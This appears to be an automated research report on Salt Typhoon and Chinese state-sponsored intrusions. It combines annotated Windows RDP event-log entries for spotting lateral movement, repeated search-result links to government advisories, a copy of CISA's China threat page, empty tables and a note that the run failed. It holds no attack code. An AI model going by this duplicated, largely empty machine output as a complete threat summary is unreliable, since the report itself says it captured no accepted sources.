22 (Windows Terminal Services Local Session Manager Operational Log) Remote Desktop Services: Shell start notification received: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted} Successful start of a new Remote Desktop session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.
23 (Windows Terminal Services Local Session Manager Operational Log) Remote Desktop Services: Session logoff succeeded: User: {redacted}\{redacted} Session ID: {redacted} Successful logoff of Remote Desktop session.
24 (Windows Terminal Services Local Session Manager Operational Log) Remote Desktop Services: Session has been disconnected: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted} Remote Desktop session disconnected by user or due to network connectivity issues.
25 (Windows  Terminal Services Local Session Manager Operational Log) Remote Desktop Services: Session reconnection succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted} Successful reconnection to a Remote Desktop Services session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.
1017 (Windows System Log)

Handle scavenged.

Share Name: C$

File Name:

users\{redacted}\downloads\History.zip Durable: 1 Resilient or Persistent: 0 Guidance: The server closed a handle that was previously reserved for a client after 60 seconds.

*[Truncated: this section shows the first 39,694 of 92,709 characters — the cut lands at the last clean paragraph or word boundary; the full source text remains in the run report JSON beside the guide.]*



|  |  |
| --- | --- |
|  |  |
|  |  |
|  |  |



- [About](https://failsearx.culturanerd.it/info/en/about)
- [Preferences](https://failsearx.culturanerd.it/preferences)
- [SearXNG](https://failsearx.culturanerd.it/)
- [duckduckgo](https://failsearx.culturanerd.it/stats?engine=duckduckgo)
- [wikidata](https://failsearx.culturanerd.it/stats?engine=wikidata)
- [startpage](https://failsearx.culturanerd.it/stats?engine=startpage)
- [wikipedia](https://failsearx.culturanerd.it/stats?engine=wikipedia)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa25-239a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [https://www.fbi.gov
› video-repository › salttyphoon082725.mp4 › view](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [FBI Announces Joint Cybersecurity Advisory Related to Salt Typhoon](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [cached](https://web.archive.org/web/https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [https://www.extrahop.com
› blog › anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [cached](https://web.archive.org/web/https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa24-038a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [https://www.cisa.gov
› topics › cyber-threats-and-advisories › nation-state-cyber-actors › china](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [China Threat Overview and Advisories - CISA](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [cached](https://web.archive.org/web/https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [https://en.wikipedia.org
› wiki › Salt_Typhoon](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [Salt Typhoon - Wikipedia](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [cached](https://web.archive.org/web/https://en.wikipedia.org/wiki/Salt_Typhoon)
- [https://cert.gov.ng
› advisories › salt-typhoon-apt-group-cyber-espionage-campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [Salt Typhoon Apt Group Cyber Espionage Campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [cached](https://web.archive.org/web/https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.pdf](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [Countering Chinese State-Sponsored Actors Compromise of ... - BSI](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [https://www.ic3.gov
› CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [https://deepstrike.io
› blog › salt-typhoon](https://deepstrike.io/blog/salt-typhoon)
- [Salt Typhoon: Inside China's Telecom Espionage Campaign](https://deepstrike.io/blog/salt-typhoon)
- [cached](https://web.archive.org/web/https://deepstrike.io/blog/salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › Article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State-Sponsored Actors ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.ashurstperkinscoie.com
› en › insights › salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [Salt Typhoon Cyberattacks: Updated Threat Assessment and ...](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [cached](https://web.archive.org/web/https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [https://globalcyberalliance.org
› new-report-salt-typhoon-across-the-internet](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [New Report: Salt Typhoon Across the Internet - GCA](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [cached](https://web.archive.org/web/https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [https://www.congress.gov
› crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [https://eclypsium.com
› blog › cisa-fbi-salt-typhoon-guidance](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [New Salt Typhoon Defense Guidance from FBI and CISA - Eclypsium](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [cached](https://web.archive.org/web/https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.html](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [Joint Cybersecurity advisory (CSA) about SALT TYPHOON](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [https://failsearx.culturanerd.it/search#](https://failsearx.culturanerd.it/search#)
- [SearXNG](https://failsearx.culturanerd.it/info/en/about)
- [Source code](https://github.com/searxng/searxng)
- [Issue tracker](https://github.com/searxng/searxng/issues)
- [Engine stats](https://failsearx.culturanerd.it/stats)
- [Public instances](https://searx.space/)



- [https://www.ic3.gov › CSA › 2025 › 250827.pdf  ](https://www.ic3.gov/CSA/2025/250827.pdf)



- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)



- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)



- [https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf  ](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



### China Threat Overview and Advisories - CISA


An official website of the United States government

Here’s how you know

Search

Cyber Threats and Response
Nation-State Threats
China Threat Overview and Advisories
SHARE:
Opens in a new window
Opens in a new window
Opens in a new window
China Threat Overview and Advisories

CISA works to ensure U.S. critical infrastructure, government partners, and others have the information and guidance to defend themselves against state-sponsored cybersecurity risks.

Nation-State Threats
China Threat Overview and Advisories
Iran Threat Overview and Advisories
North Korea Threat Overview and Advisories
Russia Threat Overview and Advisories

REPORT TO CISA

State-Sponsored Cyber Threat Advisories

Review China-specific advisories here.

VIEW PUBLICATIONS
Threat Environment

The Office of the Director of National Intelligence’s 2026 Annual Threat Assessment highlights persistent cyber threats to U.S. government, private sector, and critical infrastructure networks posed by Chinese government-linked cyber actors. These advanced persistent threat (APT) actors, such as Volt Typhoon and Salt Typhoon, exhibit tactics and target selection that extend beyond traditional cyber espionage or intelligence-gathering operations.

CISA, NSA, and FBI assess that Chinese government-linked APT actors are positioning themselves within information technology networks, enabling lateral movement to operational technology systems—the hardware and software that control critical infrastructure. This positioning allows them to disrupt critical functions at a time of their choosing. The relatively recent breach of U.S. telecommunications infrastructure by Chinese government-linked Salt Typhoon actors underscores the growing scope and sophistication of China’s cyber capabilities. CISA continues to address a wide range of Chinese state-sponsored cybersecurity threats.

Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data

Chinese Government-linked threat actors enabled by the Integrity Technology Group using botnets, VPNs, living off the land techniques, and exploitation tools to exfiltrate data and establish persistence.

VIEW ADVISORY
China-Based Super Intelligence Companies Conducting Industrial-Scale Distillation Campaigns Against U.S. SI Companies

CISA and partners issued this advisory to help U.S. super intelligence (SI) companies and their ecosystems identify, mitigate, and share information on knowledge distillation campaigns by China-based companies seeking to extract proprietary capabilities.

VIEW ADVISORY
Collaboration in Action

CISA is actively countering the evolving cyber threats posed by Chinese state-sponsored APT actors through strategic initiatives to strengthen the defense of U.S. critical infrastructure. By working closely with U.S. government agencies, international partners, and industry stakeholders, CISA is fostering a more secure cyberspace, making it increasingly difficult for Chinese government-linked cyber threat actors to execute large-scale compromises.

Key CISA initiatives to actively strengthen defenses against Chinese state-sponsored APTs include:

Facilitating public-private collaboration to leverage private sector partner visibility and capabilities, collectively defending against Chinese government-linked cyber threat actors by hardening network edge devices.
Providing cybersecurity capabilities, services, and tools to address the most pressing and prevalent threats.
Partnering to investigate and mitigate zero-day and n-day exploitation of network edge devices by sophisticated Chinese government-linked cyber threat actors.
Strengthening cloud infrastructure on a large scale.
Collaborating with Sector Risk Management Agencies and critical infrastructure owners/operators to address sector-specific challenges, including those affecting the nation's pipeline infrastructure, aviation sector, and water/wastewater sector.
Key Resources
Defending Against Nation-State Cyber Threats

Find more information on nation-state adversaries and related resources.

Physical Security

Find preventative and protective strategies to strengthen physical security.

Securing Public Gatherings

Find more information on mitigating security risks associated with public gatherings.

CISA Voluntary Cyber Incident Reporting

This resource is designed to help entities that may be considering voluntarily reporting cyber incidents understand “who” CISA recommends report an incident, “why and when” CISA recommends they report, as well as “what and how to report.”

Return to top
X
1-844-Say-CISA contact@cisa.dhs.gov
DHS Seal
CISA.gov
An official website of the U.S. Department of Homeland Security
About CISA
Budget and Performance
Office of Inspector General
The White House
USA.gov
Website Feedback



|  |  |
| --- | --- |
|  |  |
|  |  |
|  |  |



- [About](https://failsearx.culturanerd.it/info/en/about)
- [Preferences](https://failsearx.culturanerd.it/preferences)
- [SearXNG](https://failsearx.culturanerd.it/)
- [duckduckgo](https://failsearx.culturanerd.it/stats?engine=duckduckgo)
- [wikidata](https://failsearx.culturanerd.it/stats?engine=wikidata)
- [startpage](https://failsearx.culturanerd.it/stats?engine=startpage)
- [wikipedia](https://failsearx.culturanerd.it/stats?engine=wikipedia)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa25-239a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [https://www.fbi.gov
› video-repository › salttyphoon082725.mp4 › view](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [FBI Announces Joint Cybersecurity Advisory Related to Salt Typhoon](https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [cached](https://web.archive.org/web/https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view)
- [https://www.extrahop.com
› blog › anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [cached](https://web.archive.org/web/https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.cisa.gov
› news-events › cybersecurity-advisories › aa24-038a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [cached](https://web.archive.org/web/https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [https://www.cisa.gov
› topics › cyber-threats-and-advisories › nation-state-cyber-actors › china](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [China Threat Overview and Advisories - CISA](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [cached](https://web.archive.org/web/https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [https://en.wikipedia.org
› wiki › Salt_Typhoon](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [Salt Typhoon - Wikipedia](https://en.wikipedia.org/wiki/Salt_Typhoon)
- [cached](https://web.archive.org/web/https://en.wikipedia.org/wiki/Salt_Typhoon)
- [https://cert.gov.ng
› advisories › salt-typhoon-apt-group-cyber-espionage-campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [Salt Typhoon Apt Group Cyber Espionage Campaign](https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [cached](https://web.archive.org/web/https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.pdf](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [Countering Chinese State-Sponsored Actors Compromise of ... - BSI](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3)
- [https://www.ic3.gov
› CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [https://deepstrike.io
› blog › salt-typhoon](https://deepstrike.io/blog/salt-typhoon)
- [Salt Typhoon: Inside China's Telecom Espionage Campaign](https://deepstrike.io/blog/salt-typhoon)
- [cached](https://web.archive.org/web/https://deepstrike.io/blog/salt-typhoon)
- [https://www.nsa.gov
› Press-Room › Press-Releases-Statements › Press-Release-View › Article › 4287371 › nsa-and-others-p](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [NSA and Others Provide Guidance to Counter China State-Sponsored Actors ...](https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [cached](https://web.archive.org/web/https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4287371/nsa-and-others-provide-guidance-to-counter-china-state-sponsored-actors-targeti/)
- [https://www.ashurstperkinscoie.com
› en › insights › salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [Salt Typhoon Cyberattacks: Updated Threat Assessment and ...](https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [cached](https://web.archive.org/web/https://www.ashurstperkinscoie.com/en/insights/salt-typhoon-cyberattacks-updated-threat-assessment-and-recommended-mitigations/)
- [https://globalcyberalliance.org
› new-report-salt-typhoon-across-the-internet](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [New Report: Salt Typhoon Across the Internet - GCA](https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [cached](https://web.archive.org/web/https://globalcyberalliance.org/new-report-salt-typhoon-across-the-internet/)
- [https://www.congress.gov
› crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [https://eclypsium.com
› blog › cisa-fbi-salt-typhoon-guidance](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [New Salt Typhoon Defense Guidance from FBI and CISA - Eclypsium](https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [cached](https://web.archive.org/web/https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/)
- [https://www.bsi.bund.de
› SharedDocs › Downloads › EN › BSI › Cyber-Security › CSA_Salt-Typhoon.html](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [Joint Cybersecurity advisory (CSA) about SALT TYPHOON](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [cached](https://web.archive.org/web/https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.html)
- [https://failsearx.culturanerd.it/search#](https://failsearx.culturanerd.it/search#)
- [SearXNG](https://failsearx.culturanerd.it/info/en/about)
- [Source code](https://github.com/searxng/searxng)
- [Issue tracker](https://github.com/searxng/searxng/issues)
- [Engine stats](https://failsearx.culturanerd.it/stats)
- [Public instances](https://searx.space/)



- [https://www.ic3.gov › CSA › 2025 › 250827.pdf  ](https://www.ic3.gov/CSA/2025/250827.pdf)



- [PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)



- [cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)



- [https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf  ](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)



- [cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)

## 3. Comparative Data & Specs
|  |  |
| --- | --- |
|  |  |
|  |  |
|  |  |

## 4. Complete Actionable Steps / Execution Guide
DATA NOT CAPTURED — no procedure-shaped steps were present in the captured sources. Steps are never fabricated from unrelated prose.

## Research limitations
The two-stage relevance gate (deterministic pre-filter + semantic judge) removed or quarantined the following pages; they do NOT contribute any prose, facts, tables, citations, or images to this guide.

- **deprioritized** — https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a (time budget reached)
- **deprioritized** — https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china (time budget reached)
- **deprioritized** — https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a (time budget reached)
- **deprioritized** — https://en.wikipedia.org/wiki/Salt_Typhoon (time budget reached)
- **deprioritized** — https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon (time budget reached)
- **deprioritized** — https://eclypsium.com/blog/cisa-fbi-salt-typhoon-guidance/ (time budget reached)
- **deprioritized** — https://www.fbi.gov/video-repository/salttyphoon082725.mp4/view (time budget reached)
- **deprioritized** — https://cert.gov.ng/advisories/salt-typhoon-apt-group-cyber-espionage-campaign (time budget reached)
- **deprioritized** — https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Cyber-Security/CSA_Salt-Typhoon.pdf?__blob=publicationFile&v=3 (time budget reached)

**Quality warnings:**
- run hit its time budget — later pages unjudged/unscraped
- thin run: only 0 accepted page(s) — the guide reports DATA NOT CAPTURED rather than padding

---

## 5. Primary Sources & Media Links
- [Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA (relevance 85)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a)
- [PDF: https://www.ic3.gov › CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [Anatomy of an Attack: CISA Alert on Salt Typhoon - ExtraHop (relevance 100)](https://www.extrahop.com/blog/anatomy-of-an-attack-line-cisa-alert-on-salt-typhoon)
- [PDF: https://www.ic3.gov › CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PRC State-Sponsored Actors Compromise and Maintain Persistent ... - CISA (relevance 81)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
- [PDF: https://www.ic3.gov › CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [China Threat Overview and Advisories - CISA (relevance 97)](https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors/china)
- [PDF: https://www.ic3.gov › CSA › 2025 › 250827.pdf](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: PDF Countering Chinese State-Sponsored Actors Compromise of Networks ...](https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.ic3.gov/CSA/2025/250827.pdf)
- [PDF: https://www.congress.gov › crs_external_products › IF › PDF › IF12798 › IF12798.15.pdf](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: PDF Salt Typhoon Hacks of Telecommunications Companies and Federal Response ...](https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- [PDF: cached](https://web.archive.org/web/https://www.congress.gov/crs_external_products/IF/PDF/IF12798/IF12798.15.pdf)
- search lanes used: searx.space browser — (no URL recorded)
